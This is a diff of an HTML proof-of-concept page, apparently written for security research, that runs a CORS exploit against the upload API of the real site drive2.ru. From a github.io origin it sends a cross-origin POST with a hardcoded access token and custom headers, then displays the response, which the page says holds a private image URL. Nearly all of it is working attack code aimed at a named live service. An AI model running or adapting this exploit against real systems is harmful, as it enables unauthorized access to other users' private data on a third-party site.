@@ -1,57 +1,133 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS POC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC - Drive2.ru</title>
     <style>
-        body { font-family: monospace; max-width: 800px; margin: 20px; }
-        textarea { width: 100%; height: 400px; padding: 10px; }
-        input { width: 100%; padding: 8px; margin: 5px 0; }
-        button { padding: 10px 20px; margin: 10px 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f4f4f9;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d9534f;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+        button {
+            background-color: #5cb85c;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        button:hover {
+            background-color: #4cae4c;
+        }
+        #status {
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        pre {
+            background: #272822;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .label {
+            display: inline-block;
+            width: 100px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
-    <h2>CORS POC</h2>
-    
-    <label>Target URL:</label>
-    <input type="text" id="target" value="https://upload.drive2.ru/_api/upload?.AMIG=.AMIG&token=AhgCSVVQVAjeuvYUvSOQCjDhAEAADNUKMMjAgABRT5XoNp_Sb3Vkc2Bn3PoAdNJrvma_">
-    
-    <label>Select File:</label>
-    <input type="file" id="file">
-    
-    <button onclick="exploit()">Send Request</button>
-    
-    <h3>Response:</h3>
-    <textarea id="output" readonly></textarea>
+    <div class="container">
+        <h1>CORS Exploitation PoC</h1>
+        <p>This PoC attempts to perform a cross-origin file upload to <strong>drive2.ru</strong> and retrieve the response body, which contains the private image URL.</p>
+        
+        <div>
+            <span class="label">Target:</span> <code>upload-www.drive2.ru</code><br>
+            <span class="label">Origin:</span> <code>https://omarahmedalx.github.io</code>
+        </div>
+        <br>
+
+        <button id="exploitBtn">Execute Exploit</button>
+
+        <div id="status">Status: Ready</div>
+        <h3>Response Body:</h3>
+        <pre id="responseOutput">No data yet...</pre>
+    </div>
 
     <script>
-        async function exploit() {
-            const target = document.getElementById('target').value;
-            const fileInput = document.getElementById('file');
-            const output = document.getElementById('output');
+        document.getElementById('exploitBtn').addEventListener('click', async () => {
+            const statusDiv = document.getElementById('status');
+            const outputPre = document.getElementById('responseOutput');
             
-            if (!fileInput.files.length) {
-                output.value = 'Please select a file';
-                return;
-            }
+            statusDiv.textContent = 'Status: Sending request...';
+            statusDiv.style.color = 'orange';
+            outputPre.textContent = 'Loading...';
+
+            const url = "https://upload-www.drive2.ru/_api/upload?.AMIG=.AMIG&token=AhgCSVVQVAjeuvYUvSOQCjDhAEAADNUKMMjAgABRT5XoNp_Sb3Vkc2Bn3PoAdNJrvma_";
             
+            // Constructing the multipart/form-data
+            const formData = new FormData();
+            formData.append('_', 'uploadSimple');
+            formData.append('type', 'messengerimage');
+            
+            // Creating a dummy image file
+            const blob = new Blob(['dummy content'], { type: 'image/jpeg' });
+            formData.append('file', blob, 'large.jpg');
+
             try {
-                const formData = new FormData();
-                formData.append('_', 'uploadSimple');
-                formData.append('type', 'messengerimage');
-                formData.append('file', fileInput.files[0]);
-                
-                const response = await fetch(target, {
+                const response = await fetch(url, {
                     method: 'POST',
-                    credentials: 'include',
+                    mode: 'cors', // Explicitly set CORS mode
+                    // Note: We don't set Content-Type header manually for FormData, 
+                    // browser will set it with the correct boundary.
+                    headers: {
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'X-Origin-Request-Id': '52b9221fda3e008e3c84d165c3b11d7a',
+                        'X-Client-Request-Id': '43cdd6c9edfe435d9082ebd8452c59ba'
+                    },
                     body: formData
                 });
-                
-                const data = await response.json();
-                output.value = JSON.stringify(data, null, 2);
-            } catch (e) {
-                output.value = 'Error: ' + e.message;
+
+                if (response.ok || response.status) {
+                    const text = await response.text();
+                    statusDiv.textContent = `Status: Success (${response.status})`;
+                    statusDiv.style.color = 'green';
+                    outputPre.textContent = text;
+                    console.log('Response:', text);
+                } else {
+                    statusDiv.textContent = `Status: Failed (${response.status})`;
+                    statusDiv.style.color = 'red';
+                    outputPre.textContent = 'Request failed. Check console for CORS errors.';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                statusDiv.textContent = 'Status: Error (Check console)';
+                statusDiv.style.color = 'red';
+                outputPre.textContent = 'CORS error or network failure. This likely means the server does not allow cross-origin requests from this origin with these headers.';
             }
-        }
+        });
     </script>
 </body>
 </html>
